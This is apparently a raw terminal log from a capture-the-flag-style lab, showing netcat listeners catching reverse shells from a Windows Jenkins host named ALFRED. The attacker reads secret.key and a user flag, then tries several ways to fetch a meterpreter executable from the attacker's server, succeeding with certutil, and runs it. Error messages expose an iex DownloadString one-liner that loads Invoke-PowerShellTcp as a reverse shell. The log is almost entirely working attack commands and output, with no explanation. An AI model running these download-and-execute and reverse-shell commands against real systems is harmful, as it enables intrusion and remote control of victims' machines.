
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.154.33] 49189
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami
whoami
alfred\bruce

C:\Program Files (x86)\Jenkins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of C:\Program Files (x86)\Jenkins

06/06/2024  03:52 PM    <DIR>          .
06/06/2024  03:52 PM    <DIR>          ..
06/06/2024  03:52 PM                 0 .lastStarted
10/26/2019  12:20 PM                37 .owner
06/06/2024  03:52 PM             1,742 config.xml
06/06/2024  03:52 PM               156 hudson.model.UpdateCenter.xml
10/25/2019  07:58 PM               374 hudson.plugins.git.GitTool.xml
10/25/2019  09:55 PM             1,712 identity.key.enc
06/06/2024  03:52 PM           106,964 jenkins.err.log
09/25/2019  02:10 PM           371,200 jenkins.exe
04/05/2015  06:05 PM               219 jenkins.exe.config
10/25/2019  07:59 PM                 7 jenkins.install.InstallUtil.lastExecVersion
10/25/2019  07:59 PM                 7 jenkins.install.UpgradeWizard.state
10/25/2019  07:59 PM               177 jenkins.model.JenkinsLocationConfiguration.xml
06/06/2024  03:51 PM             1,992 jenkins.out.log
06/06/2024  03:51 PM                 4 jenkins.pid
10/25/2019  09:55 PM               171 jenkins.telemetry.Correlator.xml
09/25/2019  02:05 PM        78,245,883 jenkins.war
06/06/2024  03:51 PM            22,494 jenkins.wrapper.log
09/25/2019  02:10 PM             2,875 jenkins.xml
10/26/2019  04:37 PM    <DIR>          jobs
10/25/2019  09:54 PM    <DIR>          jre
10/25/2019  09:55 PM    <DIR>          logs
06/06/2024  03:52 PM               907 nodeMonitors.xml
10/25/2019  09:55 PM    <DIR>          nodes
10/25/2019  07:58 PM    <DIR>          plugins
10/26/2019  04:39 PM               129 queue.xml.bak
10/25/2019  09:54 PM                64 secret.key
10/25/2019  09:54 PM                 0 secret.key.not-so-secret
10/26/2019  04:38 PM    <DIR>          secrets
10/03/2020  03:42 PM    <DIR>          updates
10/25/2019  09:55 PM    <DIR>          userContent
10/25/2019  09:55 PM    <DIR>          users
10/25/2019  09:54 PM    <DIR>          war
10/25/2019  07:58 PM    <DIR>          workflow-libs
10/26/2019  04:38 PM    <DIR>          workspace
              22 File(s)     78,757,114 bytes
              14 Dir(s)  20,525,543,424 bytes free

C:\Program Files (x86)\Jenkins>type secret.key
type secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
C:\Program Files (x86)\Jenkins>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of c:\Users

10/26/2019  09:22 PM    <DIR>          .
10/26/2019  09:22 PM    <DIR>          ..
10/25/2019  08:05 PM    <DIR>          bruce
10/25/2019  10:21 PM    <DIR>          DefaultAppPool
11/21/2010  08:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  20,525,543,424 bytes free

c:\Users>cd bruce
cd bruce

c:\Users\bruce>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of c:\Users\bruce

10/25/2019  08:05 PM    <DIR>          .
10/25/2019  08:05 PM    <DIR>          ..
10/25/2019  08:05 PM    <DIR>          .groovy
10/25/2019  09:51 PM    <DIR>          Contacts
10/25/2019  11:22 PM    <DIR>          Desktop
10/26/2019  04:43 PM    <DIR>          Documents
10/26/2019  04:43 PM    <DIR>          Downloads
10/25/2019  09:51 PM    <DIR>          Favorites
10/25/2019  09:51 PM    <DIR>          Links
10/25/2019  09:51 PM    <DIR>          Music
10/25/2019  10:26 PM    <DIR>          Pictures
10/25/2019  09:51 PM    <DIR>          Saved Games
10/25/2019  09:51 PM    <DIR>          Searches
10/25/2019  09:51 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  20,525,543,424 bytes free

c:\Users\bruce>cd desktop
cd desktop

c:\Users\bruce\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of c:\Users\bruce\Desktop

10/25/2019  11:22 PM    <DIR>          .
10/25/2019  11:22 PM    <DIR>          ..
10/25/2019  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  20,525,543,424 bytes free

c:\Users\bruce\Desktop>type user.txt
type user.txt
79007a09481963edf2e1321abd9ae2a0
c:\Users\bruce\Desktop>exit
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.154.33] 49283
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins\workspace\project> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.21.236:8000/revsh-meterpr-444.exe','revsh-meterpr-444.exe')"
PS C:\Program Files (x86)\Jenkins\workspace\project> ned an error: (404) Not Found."
At line:1 char:47
+ (New-Object System.Net.WebClient).Downloadfile <<<< ('http://10.18.21.236:800
0/revsh-meterpr-444.exe','revsh-meterpr-444.exe')
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 

^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.154.33] 49320
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
PS C:\Program Files (x86)\Jenkins\workspace\project> powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://10.18.21.236:8000/revsh-meterpr-444.exe','revsh-meterpr-444.exe')"
PS C:\Program Files (x86)\Jenkins\workspace\project>  


PS C:\Program Files (x86)\Jenkins\workspace\project> dir
PS C:\Program Files (x86)\Jenkins\workspace\project> (New-Object System.Net.WebClient).Downloadfile('http://10.18.21.236:8000/shells/revsh-meterpr-444.exe','revsh-meterpr-444.exe')
PS C:\Program Files (x86)\Jenkins\workspace\project> 
PS C:\Program Files (x86)\Jenkins\workspace\project> 
PS C:\Program Files (x86)\Jenkins\workspace\project> 
PS C:\Program Files (x86)\Jenkins\workspace\project> iwr "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" -outfile "C:\windows\temp\revsh-meterpr-444.exe"
PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-PowerShellTcp : The term 'iwr' is not recognized as the name of a cmdlet
, function, script file, or operable program. Check the spelling of the name, o
r if a path was included, verify that the path is correct and try again.
At line:1 char:127
+ iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shell
s/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.
18.21.236 -Port 443
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 

PS C:\Program Files (x86)\Jenkins\workspace\project> iwr "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" -outfile "C:\windows\temp\revsh-meterpr-444.exe"
PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-PowerShellTcp : The term 'iwr' is not recognized as the name of a cmdlet
, function, script file, or operable program. Check the spelling of the name, o
r if a path was included, verify that the path is correct and try again.
At line:1 char:127
+ iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shell
s/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.
18.21.236 -Port 443
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 

PS C:\Program Files (x86)\Jenkins\workspace\project> ^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.154.33] 49338
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>wget
PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-PowerShellTcp : The term 'wget' is not recognized as the name of a cmdle
t, function, script file, or operable program. Check the spelling of the name, 
or if a path was included, verify that the path is correct and try again.
At line:1 char:127
+ iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shell
s/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.
18.21.236 -Port 443
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 
Invoke-WebRequest
PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-PowerShellTcp : The term 'Invoke-WebRequest' is not recognized as the na
me of a cmdlet, function, script file, or operable program. Check the spelling 
of the name, or if a path was included, verify that the path is correct and try
 again.
At line:1 char:127
+ iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shell
s/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.
18.21.236 -Port 443
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 

PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-WebRequest
PS C:\Program Files (x86)\Jenkins\workspace\project> Invoke-PowerShellTcp : The term 'Invoke-WebRequest' is not recognized as the na
me of a cmdlet, function, script file, or operable program. Check the spelling 
of the name, or if a path was included, verify that the path is correct and try
 again.
At line:1 char:127
+ iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shell
s/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.
18.21.236 -Port 443
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.154.33] 49344
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

C:\Program Files (x86)\Jenkins>cd c:\windows\temp
cd c:\windows\temp

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of c:\Windows\Temp

06/06/2024  06:09 PM    <DIR>          .
06/06/2024  06:09 PM    <DIR>          ..
10/27/2019  12:25 AM             8,838 Amazon_SSM_Agent_20191026162504.log
10/27/2019  12:25 AM           180,060 Amazon_SSM_Agent_20191026162504_000_AmazonSSMAgentMSI.log
10/27/2019  12:25 AM             1,207 cleanup.txt
10/27/2019  12:25 AM               422 cmdout
10/27/2019  12:21 AM             1,005 dd_dotnetfx45_decompression_log.txt
10/25/2019  09:47 PM                 0 DMI687E.tmp
10/27/2019  12:25 AM             8,786 EC2ConfigService_20191026162425.log
10/27/2019  12:25 AM           262,728 EC2ConfigService_20191026162425_000_WiXEC2ConfigSetup_64.log
10/27/2019  12:25 AM                 0 FXSAPIDebugLogFile.txt
10/27/2019  12:25 AM                 0 FXSTIFFDebugLogFile.txt
10/25/2019  08:04 PM    <DIR>          hsperfdata_WIN-NPD8TIBHOIO$
10/25/2019  09:54 PM    <DIR>          jetty-0.0.0.0-8080-war-_-any-2479542305151993622.dir
10/25/2019  09:55 PM    <DIR>          jna--652807375
10/27/2019  12:21 AM         1,140,366 Microsoft .NET Framework 4.5.1 Setup_20191026_162047619.html
10/26/2019  12:17 PM             1,816 MpCmdRun.log
06/06/2024  06:09 PM            73,802 revsh-meterpr-444.exe
10/27/2019  12:25 AM                21 stage1-complete.txt
10/27/2019  12:25 AM            34,037 stage1.txt
10/16/2019  07:26 AM           113,328 svcexec.exe
10/27/2019  12:25 AM                67 tmp.dat
10/25/2019  09:47 PM           262,144 TS_C43B.tmp
10/25/2019  09:47 PM           262,144 TS_C584.tmp
10/25/2019  09:47 PM           458,752 TS_C602.tmp
10/25/2019  09:47 PM           196,608 TS_C75B.tmp
10/25/2019  09:47 PM           196,608 TS_C8A4.tmp
10/25/2019  09:47 PM           196,608 TS_C941.tmp
10/25/2019  09:47 PM           720,896 TS_C9BF.tmp
10/25/2019  09:47 PM           458,752 TS_CD89.tmp
10/25/2019  09:47 PM           262,144 TS_CE84.tmp
10/25/2019  09:54 PM         2,390,099 winstone2061818542446950210.jar
              27 File(s)      7,231,238 bytes
               5 Dir(s)  20,425,625,600 bytes free

c:\Windows\Temp>revsh-meterpr-444.exe
revsh-meterpr-444.exe

c:\Windows\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

c:\Windows\Temp>exit

```